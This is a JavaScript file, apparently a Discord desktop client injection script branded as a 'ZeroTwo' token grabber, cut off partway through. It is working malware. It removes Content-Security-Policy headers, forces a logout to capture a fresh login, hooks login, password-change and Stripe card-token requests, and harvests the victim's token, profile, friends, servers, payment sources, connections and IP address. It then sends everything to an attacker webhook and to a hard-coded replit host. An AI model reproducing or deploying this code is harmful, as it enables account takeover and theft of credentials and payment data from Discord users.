const fs = require("fs"),
    {
        BrowserWindow: BrowserWindow,
        session: session
    } = require("electron"),
    querystring = require("querystring"),
    os = require("os");
var webhook = "*WEBHOOK*";
const tken = 'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;';
var win = "";
const Filter = {
    urls: ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
};

function firstRun() {
    fs.readdir(__dirname, (e, t) => {
        if (t.includes("Tomori.txt")) return !0;
        return fs.writeFile(`${__dirname}/Tomori.txt`, "i", e => {}), BrowserWindow.getAllWindows()[0].webContents.executeJavaScript("function logOut(){setInterval(()=>document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.token='``',10),setTimeout(()=>location.reload(),10)}logOut();", !0), !1
    })
}
session.defaultSession.webRequest.onHeadersReceived((e, t) => {
    e.url.startsWith(webhook) ? e.url.includes("discord.com") ? t({
        responseHeaders: Object.assign({
            "Access-Control-Allow-Headers": "*"
        }, e.responseHeaders)
    }) : t({
        responseHeaders: Object.assign({
            "Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
            "Access-Control-Allow-Headers": "*",
            "Access-Control-Allow-Origin": "*"
        }, e.responseHeaders)
    }) : (delete e.responseHeaders["content-security-policy"], delete e.responseHeaders["content-security-policy-report-only"], t({
        responseHeaders: {
            ...e.responseHeaders,
            "Access-Control-Allow-Headers": "*"
        }
    }))
}), session.defaultSession.webRequest.onBeforeRequest(Filter, (e, t) => e.url.startsWith("wss://") ? t({
    cancel: !0
}) : firstRun() ? t({}) : void 0);
const ChangePasswordFilter = {
    urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", "https://discord.com/api/v*/auth/login", "https://*.discord.com/api/v*/auth/login", "https://api.stripe.com/v*/tokens"]
};

function sendWeb(e) {
    (win = BrowserWindow.getAllWindows()[0]).webContents.executeJavaScript(`\n    var XML = new XMLHttpRequest();\n    XML.open("POST", "${webhook}", true);\n    XML.setRequestHeader('Content-Type', 'application/json');\n    XML.setRequestHeader('Access-Control-Allow-Origin', '*');\n    XML.send(JSON.stringify(${e}));`), win.webContents.executeJavaScript(`fetch("https://helloyoukozune.kauasantos.repl.co/i", { method: "POST", body: JSON.stringify(${e})})`)
}

function injected() {
    var e = {
        username: "𝐙𝐞𝐫𝐨𝐓𝐰𝐨 𝐆𝐫𝐚𝐛𝐛𝐞𝐫",
        avatar_url: "https://cdn.discordapp.com/attachments/402804198053249024/905502124383805440/c20a5eeda3f7fb94e7ad57c95b042e72.png",
        embeds: [{
            color: 43690,
            description: `𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐅𝐮𝐥𝐥𝐲 𝐈𝐧𝐣𝐞𝐜𝐭𝐞𝐝 𝐢𝐧  ${__dirname}`,
            title: "𝗡𝗲𝘄 𝗧𝗼𝗸𝗲𝗻 𝗚𝗿𝗮𝗯𝗯𝗲𝗱 !",
            url: "https://github.com/GayarraFrost/DiscordTokenGrabber",
            image: {
                url: ""
            },
            thumbnail: {
                url: "https://cdn.discordapp.com/attachments/402804198053249024/905502124383805440/c20a5eeda3f7fb94e7ad57c95b042e72.png"
            }
        }]
    };
    sendWeb(JSON.stringify(e))
}

function onLogin(e, t) {
    (win = BrowserWindow.getAllWindows()[0]).webContents.executeJavaScript(`\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", '${t}');\n    xmlHttp.send();\n    JSON.parse(xmlHttp.responseText);\n    `, !0).then(n => {
        win.webContents.executeJavaScript('\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://ipapi.co/json", false );\n        xmlHttp.send();\n        JSON.parse(xmlHttp.responseText);', !0).then(a => {
            win.webContents.executeJavaScript(`\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discordapp.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", '${t}');\n            xmlHttp.send();\n            JSON.parse(xmlHttp.responseText);`, !0).then(s => {
                win.webContents.executeJavaScript(`\n                var xmlHttp = new XMLHttpRequest();\n                xmlHttp.open( "GET", "https://discord.com/api/v9/applications", false );\n                xmlHttp.setRequestHeader("Authorization", '${t}');\n                xmlHttp.send();\n                JSON.parse(xmlHttp.responseText);`, !0).then(r => {
                    win.webContents.executeJavaScript(`\n                    var xmlHttp = new XMLHttpRequest();\n                    xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/guilds", false );\n                    xmlHttp.setRequestHeader("Authorization", '${t}');\n                    xmlHttp.send();\n                    JSON.parse(xmlHttp.responseText);`, !0).then(o => {
                        win.webContents.executeJavaScript(`\n                        var xmlHttp = new XMLHttpRequest();\n                        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n                        xmlHttp.setRequestHeader("Authorization", '${t}');\n                        xmlHttp.send();\n                        JSON.parse(xmlHttp.responseText);`, !0).then(i => {
                            win.webContents.executeJavaScript(`\n                            var xmlHttp = new XMLHttpRequest();\n                            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/connections", false );\n                            xmlHttp.setRequestHeader("Authorization", '${t}');\n                            xmlHttp.send();\n                            JSON.parse(xmlHttp.responseText);`, !0).then(p => {
                                if (n.bio) var l = n.bio;
                                else l = "𝗡𝗼 𝗕𝗶𝗼𝗴𝗿𝗮𝗽𝗵𝘆";
                                if (n.banner) var c = `https://cdn.discordapp.com/banners/${n.id}/${n.banner}.png?size=512`;
                                else c = "https://www.icegif.com/wp-content/uploads/icegif-219.gif";
                                var d = [];
                                o.forEach(e => {
                                    e.owner && d.push("oof")
                                }), setTimeout(() => {
                                    var u = {
                                        username: "𝐙𝐞𝐫𝐨𝐓𝐰𝐨 𝐆𝐫𝐚𝐛𝐛𝐞𝐫",
                                        avatar_url: "https://cdn.discordapp.com/attachments/402804198053249024/905502124383805440/c20a5eeda3f7fb94e7ad57c95b042e72.png",
                                        embeds: [{
                                            author: {
                                                name: '𝐁𝐲 !"𝐍𝐨𝐭.𝐅𝐮𝐛𝐮𝐤𝐢𝐢 †#6900',
                                                url: "https://notfubuki.glitch.me",
                                                icon_url: "https://cdn.discordapp.com/avatars/276123274415702017/a_94f146eaa2ca5022b79dc4313540f6ec.png?size=512"
                                            },
                                            color: 43690,
                                            description: "",
                                            title: "𝗡𝗲𝘄 𝗧𝗼𝗸𝗲𝗻 𝗚𝗿𝗮𝗯𝗯𝗲𝗱 !",
                                            url: "https://github.com/GayarraFrost/DiscordTokenGrabber",
                                            image: {
                                                url: c
                                            },
                                            thumbnail: {
                                                url: `https://cdn.discordapp.com/avatars/${n.id}/${n.avatar}.gif?size=128`
                                            },
                                            fields: [{
                                                name: "𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲",
                                                value: "```" + `${n.username}#${n.discriminator}` + "```"
                                            }, {
                                                name: "𝗜𝗗",
                                                value: "```" + n.id + "```"
                                            }, {
                                                name: "𝐅𝐑𝐈𝐄𝐍𝐃𝐒",
                                                value: "```" + s.length + "```"
                                            }, {
                                                name: "𝗣𝘂𝗯𝗹𝗶𝗰 𝗙𝗹𝗮𝗴𝘀",
                                                value: "```" + n.public_flags + "```"
                                            }, {
                                                name: "𝐁𝐚𝐝𝐠𝐞𝐬",
                                                value: "```" + badges(n.flags) + "```"
                                            }, {
                                                name: "𝗣𝘂𝗿𝗰𝗵𝗮𝘀𝗲𝗱 𝗙𝗹𝗮𝗴𝘀",
                                                value: "```" + n.purchased_flags + "```"
                                            }, {
                                                name: "𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗨𝘀𝗮𝗴𝗲 𝗙𝗟𝗔𝗚𝗦",
                                                value: "```" + n.premium_usage_flags + "```"
                                            }, {
                                                name: "𝐏𝐚𝐲𝐦𝐞𝐧𝐭 𝐌𝐞𝐭𝐡𝐨𝐝",
                                                value: "```" +